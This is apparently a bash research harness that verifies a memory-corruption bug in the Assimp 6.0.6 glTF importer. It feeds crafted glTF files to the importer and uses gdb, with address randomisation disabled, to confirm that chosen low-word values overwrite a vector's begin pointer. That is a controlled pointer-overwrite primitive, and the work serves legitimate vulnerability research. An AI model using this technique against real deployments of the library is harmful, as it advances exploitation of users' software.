#!/usr/bin/env bash
# W14: MAT2/FLOAT index accessor = 16-byte overwrite, a PARTIAL low-32-bit
# replacement of the live std::vector<std::unique_ptr<aiMesh>> begin pointer.
# W10/W12's MAT4 case replaces all 64 bits; here the high 32 bits of the
# original heap pointer survive. Prediction: fault si_addr =
# (safe_begin & 0xffffffff00000000) | chosen_low_word. gdb disables ASLR, so
# safe_begin is stable within a run. A different frame/address is a preserved
# negative, not a harness failure. Author-measured, unwitnessed, no r5.
set -euo pipefail
cd "$(dirname "$0")/.."

src=pins/assimp-6.0.6
driver=harness/bin/w12_o2
if [ ! -x "$driver" ]; then
    bash harness/run-w12.sh >/dev/null
fi
mkdir -p w14/evidence
trace=w14/evidence/w14.trace
log=w14/evidence/w14.log
: >"$trace"
: >"$log"

pass=0
fail=0
check() { # name, required substring
    if grep -qF -- "$2" "$trace"; then
        printf 'PASS %s\n' "$1" | tee -a "$log"
        pass=$((pass + 1))
    else
        printf 'FAIL %s (missing: %s)\n' "$1" "$2" | tee -a "$log"
        fail=$((fail + 1))
    fi
}

sha256sum "$src/code/AssetLib/glTF/glTFAsset.inl" \
          "$src/code/AssetLib/glTF/glTFImporter.cpp" >w14/evidence/source-hashes.out
cat w14/evidence/source-hashes.out >>"$trace"

python3 - >w14/evidence/bytes.out <<'PY'
import base64, json
for name in ("idxptr-mat2-low", "idxptr-mat2-low42", "idxptr-mat2-real"):
    with open("harness/cases/%s.gltf" % name) as f:
        uri = json.load(f)["buffers"]["buf"]["uri"]
    raw = base64.b64decode(uri.split(",", 1)[1])
    print("%s low=%08x" % (name, int.from_bytes(raw[48:52], "little")))
PY

# Pre-corruption begin pointer from the safe document at the CopyVector call.
bp="$PWD/$src/code/AssetLib/glTF/glTFImporter.cpp:475"
gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
    -ex "break $bp" -ex run -ex 'print/x meshes._M_impl._M_start' \
    --args "$driver" harness/cases/safe.gltf >w14/evidence/safe-begin.out 2>&1 || true
safe_begin=$(grep -oE '0x[0-9a-f]+' w14/evidence/safe-begin.out | tail -1 || true)
printf -v safe_high '%08x' $((safe_begin >> 32))
printf 'PRE safe_begin=%s high32=0x%s\n' "$safe_begin" "$safe_high" >>"$trace"

rc=0
"$driver" harness/cases/safe.gltf >w14/evidence/safe.out 2>&1 || rc=$?
printf 'CASE safe rc=%s\n' "$rc" >>"$trace"
grep '^case=.*scene=ok' w14/evidence/safe.out >>"$trace" || true

for c in idxptr-mat2-low idxptr-mat2-low42; do
    low=$(grep -m1 "^$c low=" w14/evidence/bytes.out | cut -d= -f2)
    expected=$(printf '0x%x' $(( ((safe_begin >> 32) << 32) | 16#$low )))
    rc=0
    "$driver" "harness/cases/$c.gltf" >"w14/evidence/$c.out" 2>&1 || rc=$?
    printf 'CASE %s rc=%s\n' "$c" "$rc" >>"$trace"
    gdb -q -batch -ex 'set disable-randomization on' -x harness/w12_fault.gdb \
        --args "$driver" "harness/cases/$c.gltf" >"w14/evidence/$c-gdb.out" 2>&1 || true
    addr=$(grep -m1 '^FAULT ' "w14/evidence/$c-gdb.out" | grep -oE '0x[0-9a-f]+' || true)
    printf 'FAULT %s observed=%s predicted=%s\n' "$c" "$addr" "$expected" >>"$trace"
    if [ "$addr" = "$expected" ]; then
        printf 'MATCH %s\n' "$c" >>"$trace"
    fi
    if grep -qF 'CopyVector<aiMesh>' "w14/evidence/$c-gdb.out"; then
        printf 'FRAME %s copyvector\n' "$c" >>"$trace"
    fi
    # Direct slot value at the call, independent of si_addr interpretation.
    gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
        -ex "break $bp" -ex run -ex 'print/x meshes._M_impl._M_start' \
        --args "$driver" "harness/cases/$c.gltf" >"w14/evidence/$c-slot.out" 2>&1 || true
    slot=$(grep -oE '0x[0-9a-f]+' "w14/evidence/$c-slot.out" | tail -1 || true)
    printf 'SLOT %s start=%s\n' "$c" "$slot" >>"$trace"
    [ "$slot" = "$expected" ] && printf 'SLOTMATCH %s\n' "$c" >>"$trace"
done

# Negative: writing the original low word back restores start but leaves the
# vector end corrupted; the importer aborts in glibc free, it does not import
# cleanly. This is NOT a clean-import proof.
low=$(grep -m1 '^idxptr-mat2-real low=' w14/evidence/bytes.out | cut -d= -f2)
safe_low=${safe_begin#0x}
safe_low=${safe_low: -8}
if [ "$low" = "$safe_low" ]; then
    printf 'PRE real_matches_safe=1 low=%s\n' "$low" >>"$trace"
fi
gdb -q -batch -ex 'set disable-randomization on' -ex 'set breakpoint pending on' \
    -ex "break $bp" -ex run -ex 'print/x meshes._M_impl._M_start' -ex continue -ex bt \
    --args "$driver" harness/cases/idxptr-mat2-real.gltf >w14/evidence/real-gdb.out 2>&1 || true
if grep -qF 'munmap_chunk(): invalid pointer' w14/evidence/real-gdb.out; then
    printf 'NEG real abort=munmap_chunk\n' >>"$trace"
fi
grep -m1 '^0x.* in __GI___libc_free ' w14/evidence/real-gdb.out >>"$trace" || true

check 'source hashes pinned' 'glTFAsset.inl'
check 'safe document imports' 'scene=ok'
check 'MAT2 low 41414141 fault address' 'MATCH idxptr-mat2-low'
check 'MAT2 low 42424242 fault address' 'MATCH idxptr-mat2-low42'
check 'MAT2 fault frame is CopyVector' 'FRAME idxptr-mat2-low42 copyvector'
check 'corrupted slot equals prediction' 'SLOTMATCH idxptr-mat2-low'
check 'restored-low-word negative abort' 'NEG real abort=munmap_chunk'

printf 'TOTAL pass=%d fail=%d\n' "$pass" "$fail" >>"$trace"
sha256sum "$trace" >w14/evidence/w14.trace.sha256
cat "$trace"
[ "$fail" -eq 0 ]
